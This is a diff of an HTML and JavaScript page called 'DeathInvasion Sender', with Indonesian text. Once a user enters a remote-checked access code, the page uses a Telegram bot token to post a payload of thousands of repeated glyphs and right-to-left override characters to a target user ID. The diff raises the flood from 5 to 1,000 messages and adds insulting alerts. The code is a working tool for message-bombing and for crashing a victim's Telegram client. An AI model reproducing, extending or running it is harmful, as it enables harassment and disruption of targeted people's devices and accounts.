@@ -4,44 +4,100 @@
   <meta charset="UTF-8" />
   <title>DeathInvasion Sender</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #111;
-      color: #0f0;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      background: #0f0f0f;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .container {
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+    }
+
+    .login-box {
+      background: #1a1a1a;
+      padding: 2.5rem 3rem;
+      border-radius: 12px;
+      box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
+      width: 100%;
+      max-width: 400px;
       text-align: center;
-      padding: 40px;
     }
-    input, button {
-      padding: 10px;
+
+    h1 {
+      margin-bottom: 1.5rem;
+      font-size: 1.8rem;
+      color: #0f0;
+    }
+
+    input {
+      width: 100%;
+      padding: 0.8rem;
+      margin-bottom: 1rem;
       font-size: 1rem;
-      margin: 10px;
-      width: 250px;
-    }
-    button {
-      cursor: pointer;
-      background: #0f0;
       border: none;
-      color: #000;
+      border-radius: 6px;
+      background: #2b2b2b;
+      color: #0f0;
     }
+
+    button {
+      width: 100%;
+      padding: 0.8rem;
+      font-size: 1rem;
+      background: #0f0;
+      color: #000;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #00cc00;
+    }
+
     #main, #target-section {
+      margin-top: 2rem;
       display: none;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
 
-  <h1>💀 DeathInvasion Login</h1>
+  <div class="container">
+    <div class="login-box">
+      <h1>💀 DeathInvasion Login</h1>
 
-  <div id="login">
-    <input type="text" id="code-token" placeholder="Masukkan kode akses"><br>
-    <button onclick="verifyCode()">🔓 Masuk</button>
-  </div>
+      <div id="login">
+        <input type="text" id="code-token" placeholder="Masukkan kode akses">
+        <button onclick="verifyCode()">🔓 Masuk</button>
+      </div>
 
-  <div id="main">
-    <h2>💥 Sender Aktif</h2>
-    <div id="target-section">
-      <input type="text" id="target-id" placeholder="ID Telegram Target"><br>
-      <button onclick="sendBug()">🚀 Kirim Bug</button>
+      <div id="main">
+        <div id="target-section">
+          <label for="target-id">Masukkan ID Telegram Target:</label>
+          <input type="text" id="target-id" placeholder="123456789">
+          <button onclick="sendBug()">🚀 Kirim Bug</button>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -50,14 +106,14 @@
 
     async function verifyCode() {
       const code = document.getElementById('code-token').value.trim();
-      if (!code) return alert("Masukkan kode dulu 😹");
+      if (!code) return alert("Masukkan kode dulu goblok😹");
 
       try {
         const response = await fetch("https://raw.githubusercontent.com/BimxyzDev/Deathinvasion/main/key-folder/key.json");
         const data = await response.json();
 
         const entry = data.find(item => item.code === code);
-        if (!entry) return alert("❌ Kode salah!");
+        if (!entry) return alert("❌ Kode salah tolol!");
 
         BOT_TOKEN = entry.token;
 
@@ -66,28 +122,23 @@
         document.getElementById('target-section').style.display = "block";
       } catch (err) {
         console.error(err);
-        alert("❌ Gagal memverifikasi kode");
+        alert("❌ Gagal memverifikasi kode awokawok");
       }
     }
 
     async function sendBug() {
       const targetId = document.getElementById('target-id').value.trim();
-      if (!targetId) return alert("Isi ID dulu 😹");
+      if (!targetId) return alert("Isi ID dulu anjeng😹");
 
-      await sendHeavyBug(targetId, BOT_TOKEN);
-    }
-
-    async function sendHeavyBug(targetId, token) {
       const ultraBug = "꧅꧄༒︎".repeat(2048) + "\u202e".repeat(2048);
-
       const payload = {
         chat_id: targetId,
         text: `💣 *DEATH INVASION FINAL STRIKE* 💣\n\n` + ultraBug,
         parse_mode: "Markdown"
       };
 
-      for (let i = 1; i <= 5; i++) {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      for (let i = 1; i <= 1000; i++) {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
@@ -97,7 +148,7 @@
         await new Promise(res => setTimeout(res, 700));
       }
 
-      alert("✅ Bug ekstrim telah dikirim 5x ke target.");
+      alert("✅ Bug sukses terkirim!");
     }
   </script>
 
